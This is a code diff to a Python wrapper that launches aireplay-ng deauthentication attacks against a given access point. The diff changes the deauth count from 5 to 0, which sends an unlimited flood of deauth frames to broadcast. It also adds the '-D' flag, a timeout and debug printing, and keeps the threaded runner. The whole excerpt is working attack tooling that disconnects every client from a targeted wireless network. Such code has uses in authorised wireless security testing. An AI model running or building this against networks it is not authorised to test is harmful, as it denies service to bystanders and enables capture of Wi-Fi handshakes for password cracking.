@@ -12,15 +12,28 @@ aireplay_cmd_template = 'aireplay-ng'
 def runAireplay(interface, bssid):
     aireplay_cmd = list()
     aireplay_cmd.append(aireplay_cmd_template)
+    aireplay_cmd.append('-D')
     aireplay_cmd.append('--deauth')
-    aireplay_cmd.append('5')
+    aireplay_cmd.append('0')  # sending deauth to broadcast
     aireplay_cmd.append('-a')
     aireplay_cmd.append(bssid)
     aireplay_cmd.append(interface + 'mon')
 
+    print(aireplay_cmd)
+
     aireplay_process = subprocess.Popen(aireplay_cmd, stdout=PIPE, stderr=PIPE, env=env)
 
+    try:
+        outs, errs = aireplay_process.communicate(timeout=15)
+    except subprocess.TimeoutExpired:
+        aireplay_process.kill()
+        outs, errs = aireplay_process.communicate()
+
+    err_str = errs.decode('utf-8')
+    out_str = outs.decode('utf-8')
+
     return aireplay_process
+
 
 class AireplayThread(threading.Thread):
     global process
@@ -40,7 +53,7 @@ class AireplayThread(threading.Thread):
 
         while (not self._stop_event.is_set()):
             sleep(0.5)
-            print("Waiting in thread")
+            # print("Waiting in thread")
 
         process.terminate()
 
